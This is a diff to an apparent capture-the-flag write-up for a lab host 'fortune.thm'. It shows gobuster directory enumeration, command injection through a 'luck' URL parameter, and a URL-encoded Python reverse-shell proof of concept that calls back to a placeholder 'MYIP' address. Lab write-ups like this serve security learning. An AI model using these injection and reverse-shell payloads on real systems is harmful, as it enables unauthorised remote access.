@@ -96,13 +96,15 @@ this binery is just an exploit on the system and we can run it until we get a ro
 
 If you are locked out from fortuna
 
-```
-gobuster dir -w ~/Desktop/wordlistex2.txt -u http://fortune.thm
+### gobuster
+```bash
+gobuster dir -w ~/Desktop/wordlists/wordlistex2.txt -u http://fortune.thm
 ```
 found _style and a message within saying something about the luck paramater... so i just gave it a luck paramater...
 
+```html
 fortune.thm/_style/?luck=ls
-
+```
 and sure enoght it works! well.. not on the first try
 most of the time this will fail but in some cases the command will execute...
 lets check if python is around
@@ -127,4 +129,5 @@ poc:
 http://fortune.thm/_styles/?luck=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22MYIP%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
 ```
 
-and the rest is the same!
+we got a shell!
+and the rest is the same.
